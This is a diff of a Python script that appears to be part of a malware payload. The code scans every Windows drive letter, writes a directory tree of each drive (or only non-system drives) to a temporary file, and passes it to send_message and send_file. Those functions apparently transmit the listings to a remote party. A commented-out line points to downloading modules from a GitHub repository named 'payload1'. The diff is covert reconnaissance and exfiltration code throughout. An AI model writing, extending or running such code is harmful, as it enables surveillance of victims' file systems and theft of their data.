@@ -106,7 +106,7 @@ def tree(directory, file, prefix=''):
             connector = '├── ' if index < len(contents) - 1 else '└── '
             file.write(prefix + connector + name + '\n')
 
-def process_path(letterpath, parameter):
+def process_path(letterpath):
     with tempfile.NamedTemporaryFile(delete=False, mode='w', encoding='utf-8') as temp_file:
         tree(letterpath, temp_file)
         temp_file_path = temp_file.name
@@ -114,20 +114,29 @@ def process_path(letterpath, parameter):
     send_message(letterpath)
     send_file(temp_file_path)
 
-def disk_tree(parameter):
+def disk_tree(disk, parameter):
+    if parameter == 1:
+        process_path(disk)
+    elif parameter == 2:
+        if not (os.path.isdir(disk + "Windows\\system32") or os.path.isdir("/usr/bin")):
+            process_path(disk)
+
+def scan_disks():
     maj_letters = list(string.ascii_uppercase)
+    disks = []
     for maj_letter in maj_letters:
         letterpath = f"{maj_letter}:\\"
         if os.path.isdir(letterpath):
-            if parameter == 1:
-                process_path(letterpath, parameter)
-            elif parameter == 2:
-                if not (os.path.isdir(letterpath + "Windows\\system32") or os.path.isdir("/usr/bin")):
-                    process_path(letterpath, parameter)
+            disks.append(letterpath)
+    return disks
 
 #Install modules :
 #download_and_install_whls('https://api.github.com/repos/slayy2357/payload1/contents/modules')
 
+#Scan all available disks function
+disks = scan_disks()
+
 #Param 1 : for all disks
 #Param 2 : for no OS disks
-disk_tree(1)
+for disks in disks:
+    disk_tree(disks, 1)
